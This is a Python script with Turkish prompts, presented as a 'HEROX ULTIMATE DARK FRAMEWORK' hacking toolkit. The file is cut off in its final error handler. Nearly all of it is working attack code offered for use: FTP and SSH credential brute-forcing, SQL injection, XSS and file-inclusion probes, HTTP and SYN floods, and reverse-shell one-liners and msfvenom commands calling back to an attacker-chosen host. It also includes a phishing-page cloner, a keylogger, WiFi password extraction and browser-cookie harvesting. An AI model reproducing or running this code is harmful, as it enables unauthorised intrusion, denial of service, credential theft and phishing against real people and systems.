#!/usr/bin/env python3
import os
import sys
import time
import socket
import hashlib
import base64
import random
import threading
import subprocess
import requests
import re
import ftplib
import smtplib
import paramiko
import dns.resolver
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

os.system('cls' if os.name == 'nt' else 'clear')

class C:
    R = '\033[91m'
    G = '\033[92m'
    Y = '\033[93m'
    B = '\033[94m'
    M = '\033[95m'
    CY = '\033[96m'
    W = '\033[97m'
    BOLD = '\033[1m'
    END = '\033[0m'

BANNER = f"""{C.R}
╔═══════════════════════════════════════════════════════════════╗
║   ██╗  ██╗███████╗██████╗  ██████╗ ██╗  ██╗                  ║
║   ██║  ██║██╔════╝██╔══██╗██╔═══██╗╚██╗██╔╝                  ║
║   ███████║█████╗  ██████╔╝██║   ██║ ╚███╔╝                   ║
║   ██╔══██║██╔══╝  ██╔══██╗██║   ██║ ██╔██╗                   ║
║   ██║  ██║███████╗██║  ██║╚██████╔╝██╔╝ ██╗                  ║
║   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝                  ║
║                                                               ║
║   {C.W}██████╗ ██╗   ██╗██╗████████╗██╗███╗   ███╗{C.R}                  ║
║   {C.W}██╔══██╗██║   ██║██║╚══██╔══╝██║████╗ ████║{C.R}                  ║
║   {C.W}██████╔╝██║   ██║██║   ██║   ██║██╔████╔██║{C.R}                  ║
║   {C.W}██╔══██╗██║   ██║██║   ██║   ██║██║╚██╔╝██║{C.R}                  ║
║   {C.W}██║  ██║╚██████╔╝██║   ██║   ██║██║ ╚═╝ ██║{C.R}                  ║
║   {C.W}╚═╝  ╚═╝ ╚═════╝ ╚═╝   ╚═╝   ╚═╝╚═╝     ╚═╝{C.R}                  ║
║                                                               ║
║   {C.CY}ULTIMATE DARK FRAMEWORK - TÜM MODÜLLER AKTİF{C.END}{C.R}           ║
╚═══════════════════════════════════════════════════════════════╝
{C.END}"""

def bekle():
    input(f"\n{C.Y}[!] Devam etmek için Enter'a bas...{C.END}")

def port_scanner():
    target = input(f"\n{C.CY}[?] Hedef IP: {C.END}").strip()
    ports_input = input(f"{C.CY}[?] Portlar (örn: 21,22,80,443): {C.END}").strip()
    ports = [int(p.strip()) for p in ports_input.split(",") if p.strip().isdigit()]
    if not ports:
        ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 3306, 3389, 8080]
    print(f"\n{C.Y}[+] Taranıyor: {target}{C.END}\n")
    acik = []
    def tara(port):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.8)
            sonuc = s.connect_ex((target, port))
            s.close()
            if sonuc == 0:
                try:
                    srv = socket.getservbyport(port)
                except:
                    srv = "?"
                print(f"{C.G}[+] {port}/tcp AÇIK ({srv}){C.END}")
                return port
        except:
            pass
        return None
    with ThreadPoolExecutor(max_workers=50) as ex:
        sonuclar = list(ex.map(tara, ports))
    acik = [p for p in sonuclar if p]
    print(f"\n{C.CY}[+] Toplam {len(acik)} açık port bulundu.{C.END}")
    bekle()

def ftp_bruteforce():
    target = input(f"\n{C.CY}[?] FTP IP: {C.END}").strip()
    kullanici_input = input(f"{C.CY}[?] Kullanıcılar (virgülle, boş=bırak=default): {C.END}").strip()
    sifre_input = input(f"{C.CY}[?] Şifreler (virgülle, boş=default): {C.END}").strip()
    users = [u.strip() for u in kullanici_input.split(",") if u.strip()] or ["admin", "root", "ftp", "user", "test", "anonymous", "www", "web"]
    passes = [p.strip() for p in sifre_input.split(",") if p.strip()] or ["admin", "123456", "password", "ftp", "root", "12345", "password123", "admin123", "1234", "qwerty"]
    print(f"\n{C.Y}[+] FTP Bruteforce: {target}{C.END}")
    print(f"{C.CY}[i] {len(users)} kullanıcı x {len(passes)} şifre = {len(users)*len(passes)} deneme{C.END}\n")
    bulundu = False
    for user in users:
        for pwd in passes:
            try:
                ftp = ftplib.FTP()
                ftp.connect(target, timeout=5)
                ftp.login(user, pwd)
                print(f"{C.G}[✓] BAŞARILI -> {user}:{pwd}{C.END}")
                try:
                    dosyalar = ftp.nlst()
                    print(f"{C.CY}    Dosyalar: {dosyalar[:10]}{C.END}")
                except:
                    pass
                ftp.quit()
                bulundu = True
                break
            except ftplib.error_perm:
                print(f"{C.R}[x] {user}:{pwd}{C.END}")
            except Exception as e:
                print(f"{C.Y}[!] {user}:{pwd} -> {str(e)[:50]}{C.END}")
        if bulundu:
            break
    if not bulundu:
        print(f"\n{C.R}[!] Hiçbir kombinasyon çalışmadı.{C.END}")
    bekle()

def ssh_bruteforce():
    target = input(f"\n{C.CY}[?] SSH IP: {C.END}").strip()
    port = input(f"{C.CY}[?] Port (default 22): {C.END}").strip() or "22"
    users = ["root", "admin", "user", "test", "oracle", "postgres", "ubuntu", "debian", "pi", "www-data"]
    passes = ["root", "admin", "123456", "password", "toor", "12345", "password123", "admin123", "1234", "qwerty", "letmein", "welcome"]
    print(f"\n{C.Y}[+] SSH Bruteforce: {target}:{port}{C.END}\n")
    bulundu = False
    for user in users:
        for pwd in passes:
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(target, port=int(port), username=user, password=pwd, timeout=3, banner_timeout=3, auth_timeout=3)
                print(f"{C.G}[✓] BAŞARILI -> {user}:{pwd}{C.END}")
                stdin, stdout, stderr = ssh.exec_command("id && uname -a")
                print(f"{C.CY}    {stdout.read().decode()[:200]}{C.END}")
                ssh.close()
                bulundu = True
                break
            except paramiko.AuthenticationException:
                print(f"{C.R}[x] {user}:{pwd}{C.END}")
            except Exception as e:
                print(f"{C.Y}[!] {e}{C.END}")
                break
        if bulundu:
            break
    if not bulundu:
        print(f"\n{C.R}[!] Hiçbir kombinasyon çalışmadı.{C.END}")
    bekle()

def sql_injection():
    url = input(f"\n{C.CY}[?] Hedef URL (örn: http://site.com/page?id=1): {C.END}").strip()
    payloads = ["'", "\"", "' OR '1'='1", "' OR 1=1--", "' UNION SELECT NULL--", "1' AND SLEEP(5)--", "1 AND 1=1", "1 AND 1=2"]
    hatalar = ["sql syntax", "mysql_", "mysqli", "ora-", "postgresql", "sqlite", "syntax error", "unclosed quotation", "you have an error"]
    print(f"\n{C.Y}[+] SQL Injection Test: {url}{C.END}\n")
    for p in payloads:
        try:
            test = url + p if "?" in url else url + "?id=" + p
            r = requests.get(test, timeout=8, verify=False)
            alt = r.text.lower()
            for h in hatalar:
                if h in alt:
                    print(f"{C.R}[!] ZAFİYET -> Payload: {p}{C.END}")
                    print(f"{C.CY}    Hata: {h}{C.END}")
                    print(f"{C.CY}    Status: {r.status_code}, Uzunluk: {len(r.text)}{C.END}")
                    break
            else:
                print(f"{C.G}[+] {p} -> normal{C.END}")
        except Exception as e:
            print(f"{C.Y}[!] {p} -> {str(e)[:60]}{C.END}")
    bekle()

def xss_exploit():
    url = input(f"\n{C.CY}[?] Hedef URL (test parametresi olmalı, örn: http://site.com/?q=test): {C.END}").strip()
    payloads = ['<script>alert(1)</script>', '"><script>alert(1)</script>', "'><svg/onload=alert(1)>", '<img src=x onerror=alert(1)>', 'javascript:alert(1)']
    print(f"\n{C.Y}[+] XSS Test: {url}{C.END}\n")
    for p in payloads:
        test = url.replace("test", p) if "test" in url else url + p
        try:
            r = requests.get(test, timeout=8, verify=False)
            if p in r.text or p.replace('"', '&quot;') in r.text:
                print(f"{C.R}[!] ZAFİYET -> {p}{C.END}")
            else:
                print(f"{C.G}[+] {p[:40]} -> normal{C.END}")
        except Exception as e:
            print(f"{C.Y}[!] {str(e)[:60]}{C.END}")
    bekle()

def lfi_exploit():
    url = input(f"\n{C.CY}[?] Hedef URL (örn: http://site.com/page.php?file=index): {C.END}").strip()
    payloads = ["../../../../etc/passwd", "../../../../../../etc/passwd", "....//....//....//etc/passwd", "../../../../windows/win.ini", "../../../../boot.ini", "/etc/passwd", "php://filter/convert.base64-encode/resource=index.php"]
    print(f"\n{C.Y}[+] LFI Test: {url}{C.END}\n")
    for p in payloads:
        test = url.replace("index", p) if "index" in url else url + p
        try:
            r = requests.get(test, timeout=8, verify=False)
            if "root:x:" in r.text or "root:0:0" in r.text:
                print(f"{C.R}[!] ZAFİYET -> {p}{C.END}")
                print(f"{C.CY}    Çıktı: {r.text[:300]}{C.END}")
            elif "[extensions]" in r.text or "[fonts]" in r.text:
                print(f"{C.R}[!] ZAFİYET (Windows) -> {p}{C.END}")
            elif len(r.text) > 0 and "No such file" not in r.text and r.status_code == 200:
                print(f"{C.Y}[?] İlginç -> {p} (Status: {r.status_code}, Uzunluk: {len(r.text)}){C.END}")
            else:
                print(f"{C.G}[+] {p[:50]} -> normal{C.END}")
        except Exception as e:
            print(f"{C.Y}[!] {str(e)[:60]}{C.END}")
    bekle()

def rfi_exploit():
    url = input(f"\n{C.CY}[?] Hedef URL (örn: http://site.com/page.php?file=index): {C.END}").strip()
    payloads = ["http://example.com/shell.txt", "https://raw.githubusercontent.com/example/test/main/test.txt"]
    print(f"\n{C.Y}[+] RFI Test: {url}{C.END}\n")
    for p in payloads:
        test = url.replace("index", p) if "index" in url else url + p
        try:
            r = requests.get(test, timeout=8, verify=False)
            print(f"{C.CY}[i] {p} -> Status: {r.status_code}, Uzunluk: {len(r.text)}{C.END}")
        except Exception as e:
            print(f"{C.Y}[!] {str(e)[:60]}{C.END}")
    bekle()

def admin_finder():
    target = input(f"\n{C.CY}[?] Hedef Site (örn: site.com): {C.END}").strip().replace("http://", "").replace("https://", "").rstrip("/")
    paths = ["admin", "admin/", "login", "login/", "administrator", "wp-admin", "wp-login.php", "admin.php", "login.php", "admin/login", "user/login", "panel", "cpanel", "adminpanel", "dashboard", "manage", "management"]
    print(f"\n{C.Y}[+] Admin Panel Aranıyor: {target}{C.END}\n")
    bulundu = []
    for path in paths:
        for proto in ["https", "http"]:
            test = f"{proto}://{target}/{path}"
            try:
                r = requests.get(test, timeout=5, allow_redirects=True, verify=False)
                if r.status_code == 200:
                    print(f"{C.G}[+] {test} -> 200 OK{BOLD}{C.END}")
                    bulundu.append(test)
                    break
                elif r.status_code in [401, 403]:
                    print(f"{C.Y}[!] {test} -> {r.status_code}{C.END}")
                    bulundu.append(test)
                    break
            except:
                pass
    print(f"\n{C.CY}[+] {len(bulundu)} panel bulundu.{C.END}")
    bekle()

def dir_bruteforce():
    target = input(f"\n{C.CY}[?] Hedef URL (örn: http://site.com): {C.END}").strip().rstrip("/")
    wordlist = input(f"{C.CY}[?] Wordlist (boş=default): {C.END}").strip()
    default_dirs = ["admin", "backup", "backups", "uploads", "images", "img", "css", "js", "inc", "includes", "config", "database", "db", "sql", "dump", "old", "new", "test", "dev", "stage", "wp-content", "wp-includes", "wp-admin", "api", "v1", "v2", "panel", "private", "secret", "hidden", "temp", "tmp", "log", "logs", "data", "files", "download", "downloads", "assets", "static", "public", "src", "source", "lib", "vendor", "node_modules", "robots.txt", "sitemap.xml", "readme.html", "phpinfo.php", "info.php", ".env", ".git", ".htaccess"]
    dirs = default_dirs
    if wordlist and os.path.exists(wordlist):
        with open(wordlist) as f:
            dirs = [l.strip() for l in f if l.strip()]
    print(f"\n{C.Y}[+] Dizin Taraması: {target}{C.END}")
    print(f"{C.CY}[i] {len(dirs)} dizin denenecek{C.END}\n")
    bulunanlar = []
    def tara(d):
        try:
            test = f"{target}/{d}"
            r = requests.get(test, timeout=5, allow_redirects=False, verify=False)
            if r.status_code == 200:
                return (test, 200, len(r.text))
            elif r.status_code in [301, 302]:
                return (test, r.status_code, 0)
            elif r.status_code == 403:
                return (test, 403, 0)
        except:
            pass
        return None
    with ThreadPoolExecutor(max_workers=20) as ex:
        sonuclar = list(ex.map(tara, dirs))
    for s in sonuclar:
        if s:
            url, kod, uzunluk = s
            if kod == 200:
                print(f"{C.G}[+] {url} -> {kod} ({uzunluk} byte){C.END}")
            elif kod in [301, 302]:
                print(f"{C.CY}[~] {url} -> {kod} (yönlendirme){C.END}")
            elif kod == 403:
                print(f"{C.Y}[!] {url} -> 403 (erişim yasak){C.END}")
            bulunanlar.append(url)
    print(f"\n{C.CY}[+] {len(bulunanlar)} dizin bulundu.{C.END}")
    bekle()

def http_flood():
    target = input(f"\n{C.CY}[?] Hedef URL: {C.END}").strip()
    thread_sayi = int(input(f"{C.CY}[?] Thread (default 100): {C.END}").strip() or "100")
    sure = int(input(f"{C.CY}[?] Süre saniye (default 30): {C.END}").strip() or "30")
    print(f"\n{C.R}[!] HTTP Flood Başladı -> {target}{C.END}")
    print(f"{C.CY}[i] {thread_sayi} thread, {sure} saniye{C.END}\n")
    sayac = {"basarili": 0, "hata": 0}
    dur = threading.Event()
    def flood():
        while not dur.is_set():
            try:
                requests.get(target, timeout=2, verify=False)
                sayac["basarili"] += 1
            except:
                sayac["hata"] += 1
    threads = []
    for _ in range(thread_sayi):
        t = threading.Thread(target=flood, daemon=True)
        t.start()
        threads.append(t)
    baslangic = time.time()
    try:
        while time.time() - baslangic < sure:
            kalan = sure - int(time.time() - baslangic)
            print(f"\r{C.CY}[+] Kalan: {kalan}s | Başarılı: {sayac['basarili']} | Hata: {sayac['hata']}{C.END}", end="")
            time.sleep(1)
    except KeyboardInterrupt:
        pass
    dur.set()
    for t in threads:
        t.join(timeout=2)
    print(f"\n\n{C.G}[+] Toplam: {sayac['basarili']} istek gönderildi. Hata: {sayac['hata']}{C.END}")
    bekle()

def syn_flood():
    target = input(f"\n{C.CY}[?] Hedef IP: {C.END}").strip()
    port = int(input(f"{C.CY}[?] Port (default 80): {C.END}").strip() or "80")
    sure = int(input(f"{C.CY}[?] Süre saniye (default 30): {C.END}").strip() or "30")
    print(f"\n{C.R}[!] SYN Flood Başladı -> {target}:{port}{C.END}\n")
    sayac = {"gonderildi": 0, "hata": 0}
    dur = threading.Event()
    def flood():
        while not dur.is_set():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                s.connect((target, port))
                s.send(b"X" * 1024)
                s.close()
                sayac["gonderildi"] += 1
            except:
                sayac["hata"] += 1
    threads = []
    for _ in range(50):
        t = threading.Thread(target=flood, daemon=True)
        t.start()
        threads.append(t)
    baslangic = time.time()
    try:
        while time.time() - baslangic < sure:
            kalan = sure - int(time.time() - baslangic)
            print(f"\r{C.CY}[+] Kalan: {kalan}s | Gönderilen: {sayac['gonderildi']} | Hata: {sayac['hata']}{C.END}", end="")
            time.sleep(1)
    except KeyboardInterrupt:
        pass
    dur.set()
    print(f"\n\n{C.G}[+] Toplam: {sayac['gonderildi']} paket. Hata: {sayac['hata']}{C.END}")
    bekle()

def reverse_shell():
    ip = input(f"\n{C.CY}[?] Listen IP: {C.END}").strip()
    port = input(f"{C.CY}[?] Listen Port: {C.END}").strip()
    print(f"\n{C.Y}[+] Reverse Shell Payloadları:{C.END}\n")
    print(f"{C.CY}[1] Bash:{C.END}\n    bash -i >& /dev/tcp/{ip}/{port} 0>&1\n")
    print(f"{C.CY}[2] Python:{C.END}\n    python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{ip}\",{port}));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call([\"/bin/sh\",\"-i\"])'\n")
    print(f"{C.CY}[3] Netcat:{C.END}\n    nc {ip} {port} -e /bin/sh\n")
    print(f"{C.CY}[4] PHP:{C.END}\n    php -r '$s=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'\n")
    print(f"{C.CY}[5] Powershell:{C.END}\n    powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{ip}\",{port});\n")
    print(f"{C.CY}[6] Perl:{C.END}\n    perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'\n")
    bekle()

def meterpreter():
    ip = input(f"\n{C.CY}[?] LHOST: {C.END}").strip()
    port = input(f"{C.CY}[?] LPORT: {C.END}").strip()
    print(f"\n{C.Y}[+] Meterpreter Payloadları:{C.END}\n")
    print(f"{C.CY}Windows EXE:{C.END}\n    msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f exe -o shell.exe\n")
    print(f"{C.CY}Windows x64:{C.END}\n    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f exe -o shell64.exe\n")
    print(f"{C.CY}Linux ELF:{C.END}\n    msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f elf -o shell.elf\n")
    print(f"{C.CY}Android APK:{C.END}\n    msfvenom -p android/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -o shell.apk\n")
    print(f"{C.CY}Mac OSX:{C.END}\n    msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f macho -o shell.macho\n")
    print(f"{C.CY}PHP:{C.END}\n    msfvenom -p php/meterpreter_reverse_tcp LHOST={ip} LPORT={port} -f raw -o shell.php\n")
    print(f"{C.CY}Python:{C.END}\n    msfvenom -p python/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f raw -o shell.py\n")
    print(f"{C.Y}\n[+] Handler komutu:{C.END}")
    print(f"    msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST {ip}; set LPORT {port}; run\"")
    bekle()

def phishing():
    print(f"\n{C.Y}[+] Phishing Sayfa Oluşturucu{C.END}")
    secim = input(f"{C.CY}[?] (1) Google (2) Facebook (3) Instagram (4) Twitter (5) Microsoft: {C.END}").strip()
    sites = {
        "1": ("google", "https://accounts.google.com/signin"),
        "2": ("facebook", "https://www.facebook.com/login.php"),
        "3": ("instagram", "https://www.instagram.com/accounts/login/"),
        "4": ("twitter", "https://twitter.com/i/flow/login"),
        "5": ("microsoft", "https://login.microsoftonline.com/")
    }
    if secim in sites:
        isim, url = sites[secim]
        print(f"\n{C.Y}[+] Sayfa indiriliyor: {url}{C.END}")
        try:
            r = requests.get(url, timeout=10, headers={"User-Agent": "Mozilla/5.0"})
            dosya = f"phishing_{isim}.html"
            with open(dosya, "w", encoding="utf-8") as f:
                f.write(r.text)
            print(f"{C.G}[+] Kaydedildi: {dosya} ({len(r.text)} byte){C.END}")
            print(f"{C.Y}[!] Form action'ı kendi sunucuna yönlendirmeyi unutma!{C.END}")
        except Exception as e:
            print(f"{C.R}[!] Hata: {e}{C.END}")
    else:
        print(f"{C.R}[!] Geçersiz seçim{C.END}")
    bekle()

def keylogger():
    try:
        from pynput import keyboard
    except ImportError:
        print(f"{C.R}[!] pynput yüklü değil: pip install pynput{C.END}")
        bekle()
        return
    sure = int(input(f"\n{C.CY}[?] Kaç saniye dinlenecek? (default 30): {C.END}").strip() or "30")
    print(f"\n{C.R}[!] Keylogger başladı - {sure} saniye dinleniyor...{C.END}")
    print(f"{C.Y}[!] Bu süre boyunca klavyeden bir şeyler yaz.{C.END}\n")
    logs = []
    def on_press(key):
        try:
            logs.append(key.char)
        except AttributeError:
            logs.append(f"[{key.name}]")
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    baslangic = time.time()
    while time.time() - baslangic < sure:
        kalan = sure - int(time.time() - baslangic)
        print(f"\r{C.CY}[+] Kalan: {kalan}s | Kayıt: {len(logs)} tuş{C.END}", end="")
        time.sleep(1)
    listener.stop()
    metin = "".join(logs)
    print(f"\n\n{C.G}[+] Toplam {len(logs)} tuş kaydedildi.{C.END}")
    print(f"{C.Y}[+] Log:{C.END}\n{metin}")
    with open("keylog.txt", "w", encoding="utf-8") as f:
        f.write(metin)
    print(f"\n{C.G}[+] keylog.txt kaydedildi.{C.END}")
    bekle()

def screen_capture():
    try:
        import pyautogui
    except ImportError:
        print(f"{C.R}[!] pyautogui yüklü değil: pip install pyautogui{C.END}")
        bekle()
        return
    print(f"\n{C.Y}[+] Ekran görüntüsü alınıyor...{C.END}")
    try:
        ss = pyautogui.screenshot()
        dosya = f"screenshot_{int(time.time())}.png"
        ss.save(dosya)
        print(f"{C.G}[+] Kaydedildi: {dosya}{C.END}")
    except Exception as e:
        print(f"{C.R}[!] Hata: {e}{C.END}")
    bekle()

def wifi_sifreleri():
    print(f"\n{C.Y}[+] WiFi Şifreleri Çekiliyor...{C.END}\n")
    if os.name == 'nt':
        try:
            sonuc = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True, text=True, encoding="utf-8", errors="ignore")
            profiller = re.findall(r":\s*(.+?)\s*$", sonuc.stdout, re.MULTILINE)
            profiller = [p for p in profiller if p and "Profil" not in p and "Profile" not in p and ":" not in p]
            print(f"{C.CY}[i] {len(profiller)} profil bulundu.{C.END}\n")
            for profil in profiller[:20]:
                try:
                    detay = subprocess.run(["netsh", "wlan", "show", "profile", f"name={profil}", "key=clear"], capture_output=True, text=True, encoding="utf-8", errors="ignore")
                    sifre_match = re.search(r"(?:Key Content|Anahtar İçeriği)\s*:\s*(.+)", detay.stdout)
                    sifre = sifre_match.group(1).strip() if sifre_match else "YOK"
                    print(f"{C.G}[+] {profil} -> {sifre}{C.END}")
                except Exception as e:
                    print(f"{C.R}[!] {profil} -> {str(e)[:40]}{C.END}")
        except Exception as e:
            print(f"{C.R}[!] Hata: {e}{C.END}")
    else:
        print(f"{C.CY}[i] Linux sistemlerde şifreler şurada:{C.END}")
        os.system("ls -la /etc/NetworkManager/system-connections/ 2>/dev/null")
        os.system("sudo cat /etc/NetworkManager/system-connections/* 2>/dev/null | grep -E 'psk=|password='")
    bekle()

def browser_sifreleri():
    print(f"\n{C.Y}[+] Tarayıcı Şifreleri Çekiliyor...{C.END}\n")
    try:
        import browser_cookie3
    except ImportError:
        print(f"{C.R}[!] browser-cookie3 yüklü değil: pip install browser-cookie3{C.END}")
        bekle()
        return
    try:
        print(f"{C.CY}[i] Chrome cookies çekiliyor...{C.END}")
        cj = browser_cookie3.chrome()
        sayi = 0
        for cookie in cj:
            sayi += 1
        print(f"{C.G}[+] {sayi} cookie bulundu.{C.END}")
    except Exception as e:
        print(f"{C.R}[!] Chrome: {str(e)[:80]}{C.END}")
    try:
        print(f"{C.CY}[i] Firefox cookies çekiliyor...{C.END}")
        cj = browser_cookie3.firefox()
        sayi = 0
        for cookie in cj:
            sayi += 1
        print(f"{C.G}[+] {sayi} cookie bulundu.{C.END}")
    except Exception as e:
        print(f"{C.R}[!] Firefox: {str(e)[:80]}{C.END}")
    bekle()

def subdomain_finder():
    domain = input(f"\n{C.CY}[?] Domain (örn: example.com): {C.END}").strip().replace("http://", "").replace("https://", "").rstrip("/")
    wordlist = ["www", "mail", "ftp", "webmail", "smtp", "pop", "ns1", "webdisk", "ns2", "cpanel", "whm", "autodiscover", "autoconfig", "m", "imap", "test", "ns", "blog", "pop3", "dev", "www2", "admin", "forum", "news", "vpn", "ns3", "mail2", "new", "mysql", "old", "lists", "support", "mobile", "mx", "static", "docs", "beta", "shop", "sql", "secure", "demo", "cp", "calendar", "wiki", "web", "media", "email", "images", "img", "video", "download", "api", "app", "cdn", "staging", "git", "portal", "backup", "db", "dashboard"]
    print(f"\n{C.Y}[+] Subdomain Taraması: {domain}{C.END}\n")
    bulunanlar = []
    def test(sub):
        try:
            tam = f"{sub}.{domain}"
            socket.gethostbyname(tam)
            return tam
        except:
            return None
    with ThreadPoolExecutor(max_workers=30) as ex:
        sonuclar = list(ex.map(test, wordlist))
    for s in sonuclar:
        if s:
            try:
                ip = socket.gethostbyname(s)
                print(f"{C.G}[+] {s} -> {ip}{C.END}")
                bulunanlar.append(s)
            except:
                pass
    print(f"\n{C.CY}[+] {len(bulunanlar)} subdomain bulundu.{C.END}")
    bekle()

def dns_lookup():
    domain = input(f"\n{C.CY}[?] Domain: {C.END}").strip()
    print(f"\n{C.Y}[+] DNS kayıtları: {domain}{C.END}\n")
    for tip in ["A", "AAAA", "MX", "NS", "TXT", "CNAME", "SOA"]:
        try:
            cevaplar = dns.resolver.resolve(domain, tip, lifetime=5)
            print(f"{C.CY}[{tip}]{C.END}")
            for c in cevaplar:
                print(f"  {c}")
        except:
            pass
    bekle()

def whois_lookup():
    domain = input(f"\n{C.CY}[?] Domain: {C.END}").strip()
    try:
        import whois
        w = whois.whois(domain)
        print(f"\n{C.Y}[+] WHOIS: {domain}{C.END}\n")
        for key, val in w.items():
            if val:
                print(f"{C.CY}{key}:{C.END} {val}")
    except Exception as e:
        print(f"{C.R}[!] Hata: {e}{C.END}")
    bekle()

def geoip_lookup():
    ip = input(f"\n{C.CY}[?] IP: {C.END}").strip()
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}", timeout=8)
        data = r.json()
        if data.get("status") == "success":
            print(f"\n{C.G}[+] GeoIP Bilgisi:{C.END}\n")
            for k, v in data.items():
                print(f"{C.CY}{k}:{C.END} {v}")
        else:
            print(f"{C.R}[!] Bulunamadı{C.END}")
    except Exception as e:
        print(f"{C.R}[!] Hata: {e}{C.END}")
    bekle()

def hash_crack():
    hash_deger = input(f"\n{C.CY}[?] Hash değeri: {C.END}").strip()
    hash_tip = input(f"{C.CY}[?] Tip (md5/sha1/sha256): {C.END}").strip().lower()
    wordlist = input(f"{C.CY}[?] Wordlist yolu (boş=/usr/share/wordlists/rockyou.txt): {C.END}").strip() or "/usr/share/wordlists/rockyou.txt"
    if not os.path.exists(wordlist):
        print(f"{C.R}[!] Wordlist bulunamadı: {wordlist}{C.END}")
        bekle()
        return
    print(f"\n{C.Y}[+] Kırılıyor...{C.END}\n")
    with open(wordlist, "r", errors="ignore") as f:
        for line in f:
            kelime = line.strip()
            if hash_tip == "md5":
                h = hashlib.md5(kelime.encode()).hexdigest()
            elif hash_tip == "sha1":
                h = hashlib.sha1(kelime.encode()).hexdigest()
            elif hash_tip == "sha256":
                h = hashlib.sha256(kelime.encode()).hexdigest()
            else:
                print(f"{C.R}[!] Geçersiz tip{C.END}")
                bekle()
                return
            if h == hash_deger:
                print(f"{C.G}[✓] BULUNDU: {kelime}{C.END}")
                bekle()
                return
    print(f"{C.R}[!] Bulunamadı{C.END}")
    bekle()

def hash_uret():
    metin = input(f"\n{C.CY}[?] Metin: {C.END}").strip()
    print(f"\n{C.G}[+] MD5: {hashlib.md5(metin.encode()).hexdigest()}{C.END}")
    print(f"{C.G}[+] SHA1: {hashlib.sha1(metin.encode()).hexdigest()}{C.END}")
    print(f"{C.G}[+] SHA256: {hashlib.sha256(metin.encode()).hexdigest()}{C.END}")
    print(f"{C.G}[+] SHA512: {hashlib.sha512(metin.encode()).hexdigest()}{C.END}")
    bekle()

def base64_tool():
    secim = input(f"\n{C.CY}[?] (1) Encode (2) Decode: {C.END}").strip()
    metin = input(f"{C.CY}[?] Metin: {C.END}")
    try:
        if secim == "1":
            print(f"\n{C.G}[+] {base64.b64encode(metin.encode()).decode()}{C.END}")
        else:
            print(f"\n{C.G}[+] {base64.b64decode(metin).decode()}{C.END}")
    except Exception as e:
        print(f"{C.R}[!] {e}{C.END}")
    bekle()

def main_menu():
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        print(BANNER)
        print(f"""{C.CY}┌─────────────────────────────────────────────────────────────┐
│ {C.W}HEROX ULTIMATE DARK FRAMEWORK{C.CY}                            │
├─────────────────────────────────────────────────────────────┤
│ {C.G}1.{C.END}  Port Tarama            {C.G}2.{C.END}  FTP Bruteforce       │
│ {C.G}3.{C.END}  SSH Bruteforce         {C.G}4.{C.END}  SQL Injection        │
│ {C.G}5.{C.END}  XSS Exploit            {C.G}6.{C.END}  LFI Exploit          │
│ {C.G}7.{C.END}  RFI Exploit            {C.G}8.{C.END}  Admin Finder         │
│ {C.G}9.{C.END}  Dir Bruteforce         {C.G}10.{C.END} HTTP Flood           │
│ {C.G}11.{C.END} SYN Flood              {C.G}12.{C.END} Reverse Shell        │
│ {C.G}13.{C.END} Meterpreter            {C.G}14.{C.END} Phishing             │
│ {C.G}15.{C.END} Keylogger              {C.G}16.{C.END} Screen Capture       │
│ {C.G}17.{C.END} WiFi Şifreleri         {C.G}18.{C.END} Browser Cookies      │
│ {C.G}19.{C.END} Subdomain Bul          {C.G}20.{C.END} DNS Lookup           │
│ {C.G}21.{C.END} WHOIS                  {C.G}22.{C.END} GeoIP                │
│ {C.G}23.{C.END} Hash Kır              {C.G}24.{C.END} Hash Üret            │
│ {C.G}25.{C.END} Base64 Enc/Dec         {C.G}0.{C.END}  Çıkış                │
└─────────────────────────────────────────────────────────────┘{C.END}""")
        secim = input(f"\n{C.Y}[?] Seçim: {C.END}").strip()
        try:
            if secim == "0":
                print(f"\n{C.R}[+] Çıkış...{C.END}")
                break
            elif secim == "1": port_scanner()
            elif secim == "2": ftp_bruteforce()
            elif secim == "3": ssh_bruteforce()
            elif secim == "4": sql_injection()
            elif secim == "5": xss_exploit()
            elif secim == "6": lfi_exploit()
            elif secim == "7": rfi_exploit()
            elif secim == "8": admin_finder()
            elif secim == "9": dir_bruteforce()
            elif secim == "10": http_flood()
            elif secim == "11": syn_flood()
            elif secim == "12": reverse_shell()
            elif secim == "13": meterpreter()
            elif secim == "14": phishing()
            elif secim == "15": keylogger()
            elif secim == "16": screen_capture()
            elif secim == "17": wifi_sifreleri()
            elif secim == "18": browser_sifreleri()
            elif secim == "19": subdomain_finder()
            elif secim == "20": dns_lookup()
            elif secim == "21": whois_lookup()
            elif secim == "22": geoip_lookup()
            elif secim == "23": hash_crack()
            elif secim == "24": hash_uret()
            elif secim == "25": base64_tool()
            else:
                print(f"{C.R}[!] Geçersiz seçim{C.END}")
                time.sleep(1)
        except KeyboardInterrupt:
            print(f"\n{C.Y}[!] İşlem iptal edildi.{C.END}")
            bekle()
        except Exception as e:
